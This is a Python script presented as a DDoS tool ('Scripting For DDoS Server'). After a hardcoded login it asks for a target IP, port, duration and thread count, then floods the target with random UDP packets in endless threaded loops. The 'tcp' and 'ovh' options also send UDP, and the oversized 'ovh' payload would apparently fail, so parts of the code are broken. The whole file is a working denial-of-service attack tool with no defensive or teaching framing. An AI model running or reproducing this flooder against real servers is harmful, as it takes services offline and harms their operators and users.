import random
import threading
import socket
import time
import os
import sys
os.system("clear")

username = str(input(" username >"))
os.system("clear")
print(" Waiting.")
time.sleep(1)
os.system("clear")
print(" Waiting..")
time.sleep(1)
os.system("clear")
print(" Waiting...")
time.sleep(1)
os.system("clear")
print(" Waiting.")
time.sleep(1)
os.system("clear")
print(" Waiting..")
time.sleep(1)
os.system("clear")
print(" Waiting...")
time.sleep(1)
os.system("clear")
password = str(input(" password >"))
os.system("clear")
print(" Waiting.")
time.sleep(1)
os.system("clear")
print(" Waiting..")
time.sleep(1)
os.system("clear")
print(" Waiting...")
time.sleep(1)
os.system("clear")
print(" Waiting.")
time.sleep(1)
os.system("clear")
print(" Waiting..")
time.sleep(1)
os.system("clear")
print(" Waiting...")
time.sleep(1)
os.system("clear")
if password == "ernest77" and username == "user":
	print("Login")
	time.sleep(3)
else:
	print("Denied Password Wrong!")
	time.sleep(999999)
os.system("clear")

def  type(s):
        for c in s  +  '\n' :
              sys.stdout.write( c )
              sys.stdout.flush( )
              time.sleep(0.020)

print("""
		Authorized : @ERN3ST77
		Scripting For DDoS Server
		Community : @M3TROBOY
	  	Methods > udp | tcp | ovh""")
	  	
type("Berikan Methods !!")
choice = str(input(" Methods ? "))
os.system("clear")
type("Berikan Ip Server")
ip = str(input(" Hosting ?"))
os.system("clear")
type("Berikan Port Server")
port = int(input(" Port ? "))
os.system("clear")
print(" Waiting For Check Ip / Port")
time.sleep(3)
os.system("clear")
type("Berapa Lama Anda Untuk Menjalankan Mesin?")
times = int(input(" Times ? "))
os.system("clear")
type("Berapa Yang Anda Ingin Berikan?")
threads = int(input(" Attack ? "))

def udp():
	data = random._urandom(818)
	i = random.choice(("[+]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.connect((ip,port))
				s.sendto(data,addr)
			print(i +" You Have Sent")
		except:
			print(" Failed Command Please Check Your Command Back")
			
def tcp():
	data = random._urandom(65500)
	i = random.choice(("[+]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.connect((ip,port))
				s.sendto(data,addr)
			print(i +" You Have Sent")
		except:
			print(" Failed Command Please Check Your Command Back")
			
def ovh():
	data = random._urandom(999999)
	i = random.choice(("[+]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.connect((ip,port))
				s.sendto(data,addr)
			print(i +" You Have Sent")
		except:
			print(" Failed Command Please Check Your Command Back")

for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = udp)
		th.start()
	if choice == 'tcp':
		th = threading.Thread(target = tcp)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = ovh)
		th.start()
